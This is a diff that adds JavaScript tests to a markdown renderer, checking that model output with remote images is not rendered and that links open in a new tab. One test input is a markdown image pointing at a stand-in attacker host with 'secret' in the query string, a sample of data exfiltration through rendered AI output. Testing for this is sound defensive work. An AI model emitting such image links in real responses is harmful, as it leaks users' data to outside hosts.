@@ -27,3 +27,17 @@ describe('renderMarkdown', () => {
     expect(html).toContain('<strong>bold</strong>');
   });
 });
+
+describe('model output hardening', () => {
+  it('never renders remote images, which could carry data out', () => {
+    const html = renderMarkdown('See ![chart](https://evil.example/leak?q=secret) and <img src="https://evil.example/x">');
+    expect(html).not.toContain('<img');
+    expect(html).not.toContain('evil.example/x');
+  });
+
+  it('opens links in a new tab so the panel is never navigated away', () => {
+    const html = renderMarkdown('[docs](https://example.com)');
+    expect(html).toContain('target="_blank"');
+    expect(html).toContain('rel="noopener noreferrer"');
+  });
+});
